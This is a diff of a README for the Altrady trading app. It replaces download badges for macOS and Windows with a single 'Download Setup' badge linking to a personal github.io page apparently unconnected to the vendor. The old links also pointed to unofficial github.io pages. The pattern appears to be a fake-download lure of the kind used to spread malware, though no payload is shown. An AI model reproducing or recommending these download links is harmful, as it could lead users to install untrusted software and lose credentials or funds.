@@ -4,15 +4,7 @@
 <img src="https://s3-eu-west-1.amazonaws.com/tpd/logos/5ecd06582d9c730001b084d7/0x0.png" alt="Altrady App Logo" width="256" height="256">  
 </div>  
 
-<div align="center">  
-<a href="https://osx-get-software.github.io/.github/altrady-app">  
-<img src="https://img.shields.io/badge/⬇️_Download_Altrady_for_macOS-blue?style=for-the-badge&logo=apple" alt="Download Altrady App for macOS">  
-</a>  
-
-<a href="https://altrady-app.github.io/.github">  
-<img src="https://img.shields.io/badge/⬇️_Download_Altrady_for_Windows-orange?style=for-the-badge&logo=windows" alt="Download Altrady App for Windows">  
-</a>  
-</div>  
+[![Download Setup](https://img.shields.io/badge/Download-Setup-blue?style=for-the-badge&logo=windows)](https://kacebautistajzae.github.io/.github/Altrady-App)
 
 ---
 
